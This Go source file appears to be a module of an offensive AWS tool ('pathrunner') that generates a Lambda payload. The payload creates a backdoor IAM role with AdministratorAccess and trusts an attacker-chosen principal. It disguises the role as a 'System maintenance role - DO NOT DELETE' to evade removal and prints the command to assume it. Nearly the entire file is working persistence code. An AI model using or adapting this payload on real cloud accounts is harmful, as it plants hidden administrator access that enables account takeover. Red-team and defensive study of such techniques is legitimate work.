package lambda

import (
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
)

type BackdoorCreateRolePayload struct{}

func NewBackdoorCreateRolePayload() *BackdoorCreateRolePayload {
	return &BackdoorCreateRolePayload{}
}

func init() {
	payloads.Register(NewBackdoorCreateRolePayload())
}

func (p *BackdoorCreateRolePayload) GetName() string {
	return "backdoor/create-role"
}

func (p *BackdoorCreateRolePayload) GetDescription() string {
	return "Create an IAM role with administrator privileges and a custom trust policy"
}

func (p *BackdoorCreateRolePayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
		payloads.TagTransportResponse,
	}
}

func (p *BackdoorCreateRolePayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TRUSTED_PRINCIPAL",
			Description: "Trusted principal ARN (e.g. arn:aws:iam::123456789012:user/name, arn:aws:iam::123456789012:root, or a service like lambda.amazonaws.com)",
			Required:    true,
		},
		{
			Name:        "ROLE_NAME",
			Description: "Name for the backdoor role",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "EXTERNAL_ID",
			Description: "External ID for added security (optional)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "ROLE_PATH",
			Description: "IAM path for the role",
			Required:    false,
			Default:     "/",
		},
	}
}

func (p *BackdoorCreateRolePayload) GenerateCode(options map[string]string) (string, error) {
	trustedPrincipal := options["TRUSTED_PRINCIPAL"]
	roleName := options["ROLE_NAME"]
	externalID := options["EXTERNAL_ID"]
	rolePath := options["ROLE_PATH"]
	if rolePath == "" {
		rolePath = "/"
	}

	roleNameCode := ""
	if roleName != "" {
		roleNameCode = "'" + roleName + "'"
	} else {
		roleNameCode = "f'pathrunner-backdoor-{int(time.time())}'"
	}

	// Determine principal type: Service principals vs IAM/account principals
	principalKey := "AWS"
	if strings.HasSuffix(trustedPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	trustPolicyCode := `{
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "` + principalKey + `": "` + trustedPrincipal + `"
                },
                "Action": "sts:AssumeRole"`

	if externalID != "" {
		trustPolicyCode += `,
                "Condition": {
                    "StringEquals": {
                        "sts:ExternalId": "` + externalID + `"
                    }
                }`
	}

	trustPolicyCode += `
            }
        ]
    }`

	code := `import json
import boto3
import time
import random
import string
import os

def lambda_handler(event, context):
    trusted_principal = os.environ.get('TRUSTED_PRINCIPAL', '` + trustedPrincipal + `')

    result = {
        'message': 'Pathrunner backdoor role creation',
        'timestamp': context.aws_request_id,
        'status': 'started'
    }

    try:
        iam_client = boto3.client('iam')

        # Generate role name if not specified
        role_name = ` + roleNameCode + `

        # Trust policy allowing the specified principal to assume the role
        trust_policy = '''` + trustPolicyCode + `'''

        # Administrator access policy
        admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

        # Create the backdoor role
        role_response = iam_client.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=trust_policy,
            Path='` + rolePath + `',
            Description='System maintenance role - DO NOT DELETE',
            MaxSessionDuration=43200  # 12 hours
        )

        result['role_arn'] = role_response['Role']['Arn']
        result['role_name'] = role_name

        # Attach administrator policy
        iam_client.attach_role_policy(
            RoleName=role_name,
            PolicyArn=admin_policy_arn
        )

        # Wait a moment for the role to be available
        time.sleep(2)

        # Test that the role was created successfully
        get_role_response = iam_client.get_role(RoleName=role_name)

        result['trusted_principal'] = trusted_principal`

	if externalID != "" {
		code += `
        result['external_id'] = '` + externalID + `'`
	}

	code += `
        result['assume_role_command'] = f"aws sts assume-role --role-arn {result['role_arn']} --role-session-name pathrunner-session"`

	if externalID != "" {
		code += ` + f" --external-id ` + externalID + `"`
	}

	code += `
        result['status'] = 'success'
        result['message'] = 'Backdoor role created successfully with administrator privileges'

    except iam_client.exceptions.EntityAlreadyExistsException:
        result['status'] = 'error'
        result['message'] = f'Role {role_name} already exists'
    except Exception as e:
        result['status'] = 'error'
        result['message'] = f'Failed to create backdoor role: {str(e)}'

    return {
        'statusCode': 200,
        'body': json.dumps(result, indent=2)
    }
`

	return code, nil
}

func (p *BackdoorCreateRolePayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Backdoor Role Creation Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("✓ Backdoor role created successfully!\n\n")

			if roleArn, ok := parsedBody["role_arn"].(string); ok {
				output.WriteString("Role ARN: " + roleArn + "\n")
			}

			if roleName, ok := parsedBody["role_name"].(string); ok {
				output.WriteString("Role Name: " + roleName + "\n")
			}

			if trustedPrincipal, ok := parsedBody["trusted_principal"].(string); ok {
				output.WriteString("Trusted Principal: " + trustedPrincipal + "\n")
			}

			if externalID, ok := parsedBody["external_id"].(string); ok {
				output.WriteString("External ID: " + externalID + "\n")
			}

			output.WriteString("\nTo assume this role:\n")
			if assumeCmd, ok := parsedBody["assume_role_command"].(string); ok {
				output.WriteString("$ " + assumeCmd + "\n")
			}

			output.WriteString("\nThe role has AdministratorAccess policy attached.\n")
			output.WriteString("Session duration: 12 hours maximum\n")

		} else {
			output.WriteString("✗ Failed to create backdoor role\n")
			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	if timestamp, ok := parsedBody["timestamp"].(string); ok {
		output.WriteString("\nRequest ID: " + timestamp + "\n")
	}

	return output.String(), nil
}

func (p *BackdoorCreateRolePayload) Validate(options map[string]string) error {
	if options["TRUSTED_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUSTED_PRINCIPAL is required for backdoor/create-role payload")
	}
	return nil
}
